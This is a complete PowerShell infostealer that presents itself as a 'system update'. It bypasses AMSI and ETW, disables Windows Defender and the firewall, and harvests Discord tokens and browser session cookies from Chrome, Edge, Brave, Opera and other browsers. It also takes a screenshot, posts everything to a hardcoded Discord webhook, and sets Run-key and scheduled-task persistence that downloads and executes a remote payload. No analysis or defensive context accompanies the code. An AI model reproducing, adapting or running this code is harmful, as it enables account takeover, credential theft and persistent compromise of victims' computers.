# ============================================================
# SYSTEM UPDATE v23.0 (WITH USERNAME EXTRACTION)
# ============================================================

# --- AMSI BYPASS ---
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,1)
} catch {}

try {
    $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
    $d = $c.GetField('amsiEnabled','NonPublic,Static')
    $d.SetValue($null,0)
} catch {}

try {
    $e = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $e.GetField('amsiContext','NonPublic,Static')
    $g = $f.GetValue($null)
    $h = $g.GetType().GetField('_scanner','NonPublic,Instance')
    $h.SetValue($g,$null)
} catch {}

# --- ETW BYPASS ---
try {
    $x = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    $y = $x.GetField('etwEnabled','NonPublic,Static')
    $y.SetValue($null,0)
} catch {}

# --- DISABLE DEFENDER ---
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f 2>$null
$null = reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d 1 /f 2>$null
$null = netsh advfirewall set allprofiles state off 2>$null

# --- WEBHOOK ---
$hook = 'https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD'
$api = 'https://discord.com/api/v9/users/@me'

# --- CHECK WINDOWS ADMIN ---
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$adminStatus = if ($isAdmin) { "YES" } else { "NO" }

# --- REGEX PATTERNS ---
$patterns = @(
    '[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}',
    '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}',
    'MT[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
    'mfa\.[A-Za-z0-9_-]{84,95}',
    '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,38}'
)

# --- FUNCTION: DECODE TOKEN TO GET USER ID ---
function Decode-Token {
    param([string]$token)
    try {
        $parts = $token -split '\.'
        if ($parts.Count -ge 1) {
            $p1 = $parts[0]
            while ($p1.Length % 4 -ne 0) { $p1 += "=" }
            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p1))
            if ($decoded -match '^\d+$') {
                return $decoded
            }
        }
    } catch {}
    return $null
}

# --- FUNCTION: GET USERNAME FROM API ---
function Get-Username {
    param([string]$token)
    try {
        $headers = @{
            Authorization = $token
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 5 -ErrorAction Stop
        if ($r.id) {
            return "$($r.username)#$($r.discriminator)"
        }
    } catch {}
    return $null
}

# --- FUNCTION: GET TOKENS ---
function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discorddevelopment\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
        "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
    )
    
    foreach ($p in $paths) {
        if (Test-Path $p) {
            Get-ChildItem $p -File -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    if ($c) {
                        foreach ($pattern in $patterns) {
                            [regex]::Matches($c, $pattern) | ForEach-Object {
                                $token = $_.Value.Trim()
                                if ($token.Length -gt 30 -and $token -notin $tokens) {
                                    $tokens += $token
                                }
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $tokens
}

# --- FUNCTION: FILTER TOKENS ---
function FilterTokens {
    param([string[]]$tokens)
    $filtered = @()
    
    foreach ($token in $tokens) {
        $parts = $token -split '\.'
        if ($parts.Count -eq 3) {
            # Check if first part decodes to a number (user ID)
            $userId = Decode-Token -token $token
            if ($userId) {
                $filtered += [PSCustomObject]@{
                    Token = $token
                    UserId = $userId
                    Username = $null  # Will be filled later
                }
                continue
            }
            # If it starts with MT (base64 for numbers starting with 1)
            if ($token -match '^MT[A-Za-z0-9_-]+\.') {
                $userId = Decode-Token -token $token
                $filtered += [PSCustomObject]@{
                    Token = $token
                    UserId = $userId
                    Username = $null
                }
            }
        }
    }
    return $filtered
}

# --- FUNCTION: GET COOKIES ---
function Get-Cookies {
    $cookies = @()
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies",
        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $temp = "$env:TEMP\cookies_temp_$(Get-Random).db"
                Copy-Item $path $temp -Force -ErrorAction SilentlyContinue
                if (Test-Path $temp) {
                    try {
                        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
                    } catch {}
                    if ([System.Data.SQLite.SQLiteConnection] -ne $null) {
                        try {
                            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
                            $conn.Open()
                            $cmd = $conn.CreateCommand()
                            $cmd.CommandText = "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%.%' AND (name LIKE '%SID%' OR name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%login%' OR name LIKE '%_ga%' OR name LIKE '%cf_%' OR name LIKE '%__Host%' OR name LIKE '%__Secure%' OR name LIKE '%MUID%' OR name LIKE '%ANONCHK%' OR name LIKE '%dcfduid%') LIMIT 50"
                            $reader = $cmd.ExecuteReader()
                            while ($reader.Read()) {
                                $host = $reader["host_key"].ToString()
                                $name = $reader["name"].ToString()
                                $value = $reader["value"].ToString()
                                if ($value -ne $null -and $value.Length -gt 3) {
                                    $cookies += [PSCustomObject]@{ Host = $host; Name = $name; Value = $value }
                                }
                            }
                            $conn.Close()
                        } catch {}
                    }
                    Remove-Item $temp -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        }
    }
    return $cookies
}

# --- FUNCTION: SCREENSHOT ---
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        $screen = [Windows.Forms.Screen]::PrimaryScreen
        $bmp = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $g.Dispose()
        $bmp.Dispose()
        return $bytes
    } catch { return $null }
}

# --- EXECUTE ---
$rawTokens = Get-DiscordTokens
$filteredTokens = FilterTokens -tokens $rawTokens
$cookies = Get-Cookies
$screenshot = Take-Screenshot

# --- GET USERNAMES FOR FILTERED TOKENS ---
foreach ($t in $filteredTokens) {
    $username = Get-Username -token $t.Token
    if ($username) {
        $t.Username = $username
    } else {
        $t.Username = "Unknown (User ID: $($t.UserId))"
    }
}

# --- BUILD REPORT ---
$msg = "**[SYSTEM UPDATE]**`n"
$msg += "PC: $env:COMPUTERNAME`n"
$msg += "User: $env:USERNAME`n"
$msg += "Windows Admin: $adminStatus`n"
$msg += "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
$msg += "**RAW TOKENS FOUND:** $($rawTokens.Count)`n"
$msg += "**FILTERED TOKENS:** $($filteredTokens.Count)`n`n"

if ($filteredTokens.Count -gt 0) {
    $msg += "**✅ VALID TOKENS:**`n`n"
    foreach ($t in $filteredTokens) {
        $msg += "**Username:** $($t.Username)`n"
        $msg += "**Token:** ``$($t.Token)```n"
        $msg += "**User ID:** $($t.UserId)`n`n"
    }
} else {
    $msg += "**[!] No valid tokens found.**`n"
    if ($rawTokens.Count -gt 0) {
        $msg += "`n**⚠️ ALL RAW TOKENS FOUND:**`n"
        foreach ($t in $rawTokens) {
            $msg += "- ``$t```n"
        }
    }
    $msg += "`n💡 **Tip:** Make sure Discord is running and logged in.`n`n"
}

if ($cookies.Count -gt 0) {
    $msg += "**🍪 COOKIES:** ($($cookies.Count))`n"
    $i = 0
    foreach ($c in $cookies) {
        if ($i -lt 25) {
            $msg += "- $($c.Host) | $($c.Name) | $($c.Value)`n"
        }
        $i++
    }
    if ($cookies.Count -gt 25) {
        $msg += "... and $($cookies.Count - 25) more`n"
    }
} else {
    $msg += "No cookies found.`n"
}

# --- SEND REPORT ---
try {
    Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$msg} -ErrorAction SilentlyContinue
} catch {}

# --- SEND SCREENSHOT ---
if ($screenshot) {
    try {
        $boundary = "----Boundary" + (Get-Random)
        $LF = "`r`n"
        $body = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`; filename=`"screen.png`"$LF" + "Content-Type: image/png$LF$LF"
        $footer = "$LF--$boundary--$LF"
        $h = [Text.Encoding]::ASCII.GetBytes($body)
        $f = [Text.Encoding]::ASCII.GetBytes($footer)
        $req = [Net.WebRequest]::Create($hook)
        $req.Method = "POST"
        $req.ContentType = "multipart/form-data; boundary=$boundary"
        $req.ContentLength = $h.Length + $screenshot.Length + $f.Length
        $s = $req.GetRequestStream()
        $s.Write($h, 0, $h.Length)
        $s.Write($screenshot, 0, $screenshot.Length)
        $s.Write($f, 0, $f.Length)
        $s.Close()
        $req.GetResponse()
    } catch {}
}

# --- PERSISTENCE ---
$cmd = 'powershell.exe -nologo -ep bypass -w hidden -c "IEX(irm ''https://opt.wisp.uno/payload.ps1'')"'
try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue } catch {}
try { schtasks /create /tn "WindowsUpdate" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1 } catch {}
try { schtasks /create /tn "MicrosoftEdgeUpdate" /tr "$cmd" /sc onstart /f /rl highest > $null 2>&1 } catch {}

exit
